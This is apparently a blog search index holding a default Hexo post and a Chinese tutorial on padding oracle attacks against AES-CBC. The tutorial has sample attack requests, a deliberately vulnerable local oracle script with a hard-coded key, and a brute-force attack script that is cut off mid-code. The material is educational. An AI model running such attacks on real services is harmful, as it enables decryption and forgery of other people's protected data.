<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/12/02/hello-world/"/>
      <url>/2024/12/02/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></tbody></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>padding oracle攻击</title>
      <link href="/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/"/>
      <url>/2024/11/29/mi-ma-xue-suan-fa-an-quan/padding-oracle-gong-ji/</url>
      
        <content type="html"><![CDATA[<h1 id="一、CBC模式简介"><a href="#一、CBC模式简介" class="headerlink" title="一、CBC模式简介"></a>一、CBC模式简介</h1><p>CBC（Cipher Block Chaining，密码块链模式）是一种分组密码的加密模式，它通过将每个明文块与前一个密文块进行异或操作后再加密，以确保数据的安全性。</p><h2 id="1-1-CBC加密流程"><a href="#1-1-CBC加密流程" class="headerlink" title="1.1 CBC加密流程"></a>1.1 CBC加密流程</h2><p>在CBC模式中，首先对明文进行分组，每个明文块先与前一个密文块进行异或后，再进行加密。CBC模式下，每个密文块依赖于前面的所有的明文块。</p><p>涉及到的概念：</p><ol><li><strong>初始化向量（IV）</strong>：CBC模式使用一个初始化向量（IV），这是一个随机生成的值，与第一个明文块进行异或操作。IV的作用是为加密过程提供一个随机的起点，确保相同的明文块在不同的加密过程中产生不同的密文块。</li></ol><h3 id="1-1-1-加密流程"><a href="#1-1-1-加密流程" class="headerlink" title="1.1.1 加密流程"></a>1.1.1 加密流程</h3><p>其加密流程示意图如下：</p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-29%2010.00.05.png" alt="CBC模式加密流程" style="zoom:50%;"><ul><li>将明文分为固定大小的块（通常是8字节或16字节）。</li><li>第一个明文块与IV进行异或操作。</li><li>异或后的结果通过加密算法（如AES）加密，生成第一个密文块。</li><li>每个后续的明文块都与前一个密文块进行异或操作，然后再加密，生成下一个密文块。</li></ul><p>密文分组3受到明文分组1、明文分组2、明文分组3的共同影响。</p><h3 id="1-1-2-解密流程"><a href="#1-1-2-解密流程" class="headerlink" title="1.1.2 解密流程"></a>1.1.2 解密流程</h3><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-29%2010.01.51.png" alt="CBC模式解密流程" style="zoom:50%;"><ul><li>将密文分为相同的块大小。</li><li>第一个密文块通过解密算法解密，然后与IV进行异或操作，恢复出第一个明文块。</li><li>每个后续的密文块都先解密，然后与前一个密文块进行异或操作，恢复出原始的明文块。</li></ul><p>与加密过程不同的是名文分组3仅受密文分组2和密文分组3的共同影响。</p><h3 id="1-1-3-填充（Padding）"><a href="#1-1-3-填充（Padding）" class="headerlink" title="1.1.3 填充（Padding）"></a>1.1.3 填充（Padding）</h3><p>分组带来一个问题，就是明文不可能恰好是block的整数倍，对于不能整除剩余的部分数据就涉及到填充操作。</p><p>在加密最后一个不完整的明文块时，需要进行填充以确保块的大小符合加密算法的要求。常见的填充方式有PKCS#5和OneAndZeroes。</p><h4 id="1）PKCS-5："><a href="#1）PKCS-5：" class="headerlink" title="1）PKCS#5："></a>1）PKCS#5：</h4><p>在最后一个block中将不足的Byte数作为Byte值进行填充，缺少n个Byte，就填充n个0x0n，例如最后一个分组（block）缺少3个byte，就填充3个0x03到结尾。在解密时会校验明文的填充是否满足该规则，如果是以N个0x0N结束，则意味着解密操作执行成功，否则解密操作失败。</p><h4 id="2）OneAndZeroes："><a href="#2）OneAndZeroes：" class="headerlink" title="2）OneAndZeroes："></a>2）OneAndZeroes：</h4><p>在最后一个Block中将不足的byte位数以 0x80开头后续全填0x00的方式进行填充，若最后一个Block缺少3byte，则填充：0x80 0x00 0x00。</p><h1 id="二、Padding-Oracle攻击原理"><a href="#二、Padding-Oracle攻击原理" class="headerlink" title="二、Padding Oracle攻击原理"></a>二、Padding Oracle攻击原理</h1><p>这种攻击方式在2011年的Pwnie Rewards中被评为“最具有价值的服务器漏洞”，因为它能够绕过对算法的直接破解，通过旁路攻击的方式被利用。</p><p>核心原理：明文分组和填充，同时应用程序对于填充异常的响应可以作为反馈。</p><h2 id="2-1-利用场景"><a href="#2-1-利用场景" class="headerlink" title="2.1 利用场景"></a>2.1 利用场景</h2><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/decrypt.jsp?data=0000000000000000EFC2807233F9D7C097116BB33E813C5E</span><br></pre></td></tr></tbody></table></figure><p>当攻击者在篡改data值时会有以下不同的响应：</p><ul><li>如果data值没有被篡改，则解密成功，并且业务校验成功，响应200</li><li>如果data值被篡改，服务端无法完成解密，解密校验失败，则响应500</li><li>如果data值被篡改，但是服务端解密成功，但业务逻辑校验失败，则可能返回200或302等响应码,而不是响应500</li></ul><p>攻击者只需关注解密成功和解密失败的响应即可（第三种属于解密成功的响应），即可完成攻击。</p><h2 id="2-2-破解密文"><a href="#2-2-破解密文" class="headerlink" title="2.2 破解密文"></a>2.2 破解密文</h2><h3 id="2-2-1-核心思路"><a href="#2-2-1-核心思路" class="headerlink" title="2.2.1 核心思路"></a>2.2.1 核心思路</h3><p>攻击者通过修改密文并发送给服务器，观察服务器对不同密文的响应。如果密文的填充正确，服务器会返回一个成功的响应；如果填充不正确，服务器会返回一个错误响应。攻击者利用这种差异性来确定密文的正确填充，从而逐步解密密文或构造出任意明文的合法密文。</p><h3 id="2-2-2-攻击过程"><a href="#2-2-2-攻击过程" class="headerlink" title="2.2.2 攻击过程"></a>2.2.2 攻击过程</h3><p>假设有这样一个应用，请求如下：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.example.com/decrypt.jsp?data=7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</span><br></pre></td></tr></tbody></table></figure><p>即client给server提交的参数为<code>7B216A634951170FF851D6CC68FC9537858795A28ED4AAC6</code> 才能请求正常的服务.</p><h4 id="1）内在加解密过程（不为攻击者所知晓）"><a href="#1）内在加解密过程（不为攻击者所知晓）" class="headerlink" title="1）内在加解密过程（不为攻击者所知晓）"></a>1）内在加解密过程（不为攻击者所知晓）</h4><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-29%2010.03.19.png" alt="IV+密文值" style="zoom:80%;"><p>IV添加在密文的前段，即最前面8个字节。</p><ul><li>加密过程</li></ul><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.26.09.png" alt="加密过程" style="zoom:80%;"><ul><li>解密过程</li></ul><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.27.56.png" alt="解密过程" style="zoom:80%;"><p>值得注意的是，解密之后的最后一个数据块，其结尾应该包含正确的填充序列，如果不满足，加解密程序会返回异常（500）。</p><h4 id="2）攻击者视角破解密文"><a href="#2）攻击者视角破解密文" class="headerlink" title="2）攻击者视角破解密文"></a>2）攻击者视角破解密文</h4><ul><li>IV值置空</li></ul><p>取第一个Block的密文，并将初始化向量置为0，即：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> F8 <span class="number">51</span> D6 CC <span class="number">68</span> FC <span class="number">95</span> <span class="number">37</span></span><br></pre></td></tr></tbody></table></figure><p>这时的请求和响应：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request: http://sampleapp/home.jsp?UID=0000000000000000F851D6CC68FC9537</span><br><span class="line">Response: 500 - Internal Server Error</span><br></pre></td></tr></tbody></table></figure><p>回复500说明填充异常，原因是它的结尾未包含正确的填充字节：</p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.32.04.png" alt="0000000000000000F851D6CC68FC9537解密失败" style="zoom:80%;"><p>如上图所示，在解密之后，数据块的末尾并没有包含正确的填充序列，因此出现了异常。</p><ul><li>接下来尝试爆破，使得最后的填充序列满足<code>n个0xn</code>的条件</li></ul><p>我们将IV加1，并且发送同样密文</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request: http://sampleapp/home.jsp?UID=0000000000000001F851D6CC68FC9537</span><br><span class="line">Response: 500 - Internal Server Error</span><br></pre></td></tr></tbody></table></figure><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.34.03.png" alt="0000000000000001F851D6CC68FC9537解密失败" style="zoom:80%;"><p>重复发送这样的请求，每次将IV的最后一个字节加一（直至<code>0xFF</code>），那么最终我们将会产生一个合法的单字节填充序列（<code>0x01</code>）</p><p>对于可能的256个值中，只有一个值会产生正确的填充字节<code>0x01</code>，遇上这个值的时候，会得到一个不同于其他255个请求的回复结果。</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Request: http://sampleapp/home.jsp?UID=000000000000003CF851D6CC68FC9537</span><br><span class="line">Response: 200 OK</span><br></pre></td></tr></tbody></table></figure><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.36.05.png" alt="000000000000003CF851D6CC68FC9537解密成功" style="zoom:80%;"><ul><li>推断出中间值（Intermediary Value）的最后一个字节（注意中间值攻击者不知道，他是攻击者攻击的目标）</li></ul><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Intermediary Byte 异或 0×3C == 0×01, </span><br><span class="line">Intermediary Byte == 0×3C ^ 0×01, </span><br><span class="line">Intermediary Byte == 0×3D</span><br></pre></td></tr></tbody></table></figure><p>重点：第一组密文解密的中间值是一直不变的，同样也是正确的，我们通过构造IV值，使得最后一位填充值满足0x01，符合padding规则，则意味着程序解密成功（当然解密的结果肯定不是原来的明文），通过循环测试的方法，猜解出中间值的最后一位，再利用同样的方式猜解前面的中间值，直到获取到完整的中间值。</p><ul><li>推断出中间值的倒数第二个字节。</li></ul><p>构造填充值为<code>0x02 0x02</code>的场景，即存在2个填充字节，填充值为<code>0x02</code>。</p><p>此时我们已经知道了中间值得最后一位为<code>0x3D</code>,计算出初始向量的最后一位：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x3D xor 0x02 = 0x3F</span><br></pre></td></tr></tbody></table></figure><p>即初始向量为<code>0000000000000003F</code></p><p>遍历倒数第二个字节从<code>0x00~0xFF</code>，直到响应成功.</p><p>猜解出中间值得后两个字节分别为 <code>0x26 0x3D</code></p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.45.22.png" alt="破解出中间值的倒数第二个字节" style="zoom:80%;"><ul><li>推断出整个中间值</li></ul><p>运用这种技巧，我们可以最终得到解密后的中间值，也就是当整个数据块的填充值都是<code>0x08</code></p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.46.30.png" alt="中间值完整推断" style="zoom:80%;"><ul><li>明文破解</li></ul><p>当第一组密文的中间值猜解成功后，我们将中间值和已知的IV做异或，则得到第一组密文的明文：</p><figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6A 0x26 0x3D  异或  0x7B 0x21 0x6A 0x63 0x49 0x51 0x17 0x0F</span><br><span class="line">= BRIAN;12</span><br></pre></td></tr></tbody></table></figure><p>续破解第二组密文，第二组密文的IV向量是第一组密文，按照上述的逻辑构造第一组密文，即可破解出第二组明文。</p><h3 id="2-2-3-思路总结"><a href="#2-2-3-思路总结" class="headerlink" title="2.2.3 思路总结"></a>2.2.3 思路总结</h3><ul><li>将IV最后一个字节设置为0x1，不断调整IV最后一个字节（0x01-0xff），爆破使得填充规则正确(7byte+0x01)，得到中间值的最后一个字节。</li><li>在得到最后一个字节的中间值后，将IV最后一个字节设置为0x02，计算IV的最后一个字节。</li><li>不断调整IV倒数第二个字节（0x01-0xff），爆破使得填充规则正确（6byte+0x02+0x02），得到倒数第二个字节的中间值。</li><li>依次类推获得整个中间值。</li><li>中间值和IV异或获得明文。</li></ul><h2 id="2-3伪造明文"><a href="#2-3伪造明文" class="headerlink" title="2.3伪造明文"></a>2.3伪造明文</h2><p>通过密文的破解过程，我们已经掌握了中间值（中间值同密文块是绑定的）和IV。</p><p>结合解密的流程，我们可以通过操纵IV来控制（密文块）解密得到的结果。</p><p>如果想要将密文中第一个数据块解密为“TEST”这个值，您可以计算出它所需要的IV值，只要将目标明文与中间值进行异或操作即可</p><p>只要将字符串”TEST”和4个<code>0x04</code>填充字节与中间值异或之后，便可以得到最终的IV，即<code>0×6D，0×36，0×70，0×76，0×03，0×6E，0×22，0×39</code></p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.52.22.png" alt="伪造明文示例" style="zoom:80%;"><p>如何生成长度超过一个数据块的明文，比如要生成”ENCRYPT TEST”</p><p>首先还是将文本拆成数据块，并设置填充字节</p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2010.54.01.png" alt="伪造大于一个块的明文长度" style="zoom:60%;"><p>通过类似的步骤我们可以知道生成TEST0x040x040x040x04的中间值(0xc3 0x60 0xed 0xc9 0x 6d 0xf9 0x90 0x32)和IV1(也就是BLOCK1对应的密文)。</p><p>接下来，我们需要弄明白中间值IV1在作为密文是如何解密的。</p><p>只要使用与之前破解过程相同的技巧就行了，我们把它作为密文传递给应用程序，并从全部为NULL的IV开始进行暴力破解。的到IV1对应的中间值IV1_IM。</p><p>通过IV1_IM可以构造BLOCK1的明文为ENCRYPT%20，然后计算得到初始IV值。 </p><img src="Padding%20Oracle%E6%94%BB%E5%87%BB/%E6%88%AA%E5%B1%8F2024-11-28%2011.06.12.png" style="zoom:80%;"><h1 id="三、exp"><a href="#三、exp" class="headerlink" title="三、exp"></a>三、exp</h1><h2 id="3-1-poa-py"><a href="#3-1-poa-py" class="headerlink" title="3.1 poa.py"></a>3.1 poa.py</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> hexdump <span class="keyword">import</span> hexdump</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> IPython</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">plain = <span class="string">b"Hello World! MTDP! RedTeam! 23333"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">POA</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    KEY = <span class="string">b"1234567890abcdef"</span></span><br><span class="line">    IV = <span class="string">b"0102030405060708"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__pad</span>(<span class="params">cls, text: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="string">"""PKCS7 padding"""</span></span><br><span class="line">        text_length = <span class="built_in">len</span>(text)</span><br><span class="line">        amount_to_pad = AES.block_size - (text_length % AES.block_size)</span><br><span class="line">        <span class="keyword">if</span> amount_to_pad == <span class="number">0</span>:</span><br><span class="line">            amount_to_pad = AES.block_size</span><br><span class="line">        pad = <span class="built_in">chr</span>(amount_to_pad).encode()</span><br><span class="line">        <span class="keyword">return</span> text + pad * amount_to_pad</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__unpad</span>(<span class="params">cls, text: <span class="built_in">bytes</span></span>):</span><br><span class="line">        pad = text[-<span class="number">1</span>]</span><br><span class="line">        _pad = text[-pad:]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> _pad:</span><br><span class="line">            <span class="keyword">if</span> pad != i:</span><br><span class="line">                <span class="keyword">raise</span> Exception(<span class="string">"Error Padding! - %s"</span> % _pad)</span><br><span class="line">        <span class="keyword">return</span> text[:-pad]</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cls, plain: <span class="built_in">bytes</span></span>):</span><br><span class="line">        pad_plain = cls.__pad(plain)</span><br><span class="line">        aes = AES.new(mode=AES.MODE_CBC, key=cls.KEY, iv=cls.IV)</span><br><span class="line">        cipher = aes.encrypt(pad_plain)</span><br><span class="line">        hexdump(cipher)</span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cls, cipher: <span class="built_in">bytes</span></span>):</span><br><span class="line">        aes = AES.new(mode=AES.MODE_CBC, key=cls.KEY, iv=cls.IV)</span><br><span class="line">        pad_plain = aes.decrypt(cipher)</span><br><span class="line">        <span class="keyword">return</span> cls.__unpad(pad_plain)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decrypt_without_result</span>(<span class="params">cls, cipher: <span class="built_in">bytes</span></span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cls.decrypt(cipher)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="comment"># print(e)</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    <span class="keyword">return</span> POA.encrypt(plain)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    cipher = test()</span><br><span class="line">    plain = POA.decrypt(cipher)</span><br><span class="line">    <span class="built_in">print</span>(plain)</span><br><span class="line"></span><br><span class="line">    IPython.embed()</span><br></pre></td></tr></tbody></table></figure><h2 id="3-2-poa-attack-py"><a href="#3-2-poa-attack-py" class="headerlink" title="3.2 poa_attack.py"></a>3.2 poa_attack.py</h2><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pdb</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> poa <span class="keyword">import</span> test, POA</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> IPython</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PaddingOracleAttack</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, cipher, iv</span>):</span><br><span class="line">        <span class="variable language_">self</span>.cipher = cipher</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 把密文分割成列表，每个列表元素16字节</span></span><br><span class="line">        <span class="variable language_">self</span>.cipher_lst = <span class="variable language_">self</span>.split_block(<span class="variable language_">self</span>.cipher)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 解密的中间值</span></span><br><span class="line">        <span class="variable language_">self</span>.mid_lst = [<span class="variable language_">self</span>.brute_middle(<span class="variable language_">self</span>.cipher_lst[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 存储计算出来的明文</span></span><br><span class="line">        <span class="variable language_">self</span>.plain_lst = [[] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="variable language_">self</span>.cipher_lst]</span><br><span class="line"></span><br><span class="line"><span class="meta">    @classmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">split_block</span>(<span class="params">cls, cipher</span>):</span><br><span class="line">        cipher_list = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(cipher), <span class="number">16</span>):</span><br><span class="line">            cipher_list.append(cipher[i: i + <span class="number">16</span>])</span><br><span class="line">        <span class="keyword">return</span> cipher_list</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">calc_new_tail</span>(<span class="params">self, tail, idx</span>):</span><br><span class="line">        new_tail = <span class="string">b""</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> tail:</span><br><span class="line">            _tail = t ^ (idx - <span class="number">1</span>) ^ idx</span><br><span class="line">            new_tail += _tail.to_bytes(<span class="number">1</span>, byteorder=<span class="string">"big"</span>)</span><br><span class="line">        <span class="keyword">return</span> new_tail</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">brute_middle</span>(<span class="params">self, cipher_line</span>):</span><br><span class="line">        <span class="string">'''暴力破解解密的中间值'''</span></span><br><span class="line">        tail = <span class="string">b""</span></span><br><span class="line">        mid_lst = []</span><br><span class="line">        <span class="comment"># 从pad 为0x01开始 到 0x10</span></span><br><span class="line">        <span class="keyword">for</span> pad <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">17</span>):</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 计算新的pad尾部，因为每计算出来一个pad，再往前计算新的pad的时候，尾部的每一个值异或出来都要放大1位。</span></span><br><span class="line">            tail = <span class="variable language_">self</span>.calc_new_tail(tail, pad)</span><br><span class="line"></span><br><span class="line">            find_pad = <span class="literal">False</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):</span><br><span class="line">                <span class="comment"># 形成2个密文块</span></span><br><span class="line">                cipher = <span class="string">b"\x00"</span> * (<span class="number">16</span> - pad) + i.to_bytes(<span class="number">1</span>, byteorder=<span class="string">"big"</span>) + tail + cipher_line</span><br><span class="line">                <span class="keyword">if</span> POA.decrypt_without_result(cipher):</span><br><span class="line">                    <span class="comment"># print("[!] Cipher - %s" % cipher)</span></span><br><span class="line">                    find_pad = <span class="literal">True</span></span><br><span class="line">                    tail = i.to_bytes(<span class="number">1</span>, byteorder=<span class="string">"big"</span>) + tail</span><br><span class="line"></span><br><span class="line">                    mid_chr = i ^ pad</span><br><span class="line">                    mid_lst.insert(<span class="number">0</span>, mid_chr)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> find_pad:</span><br><span 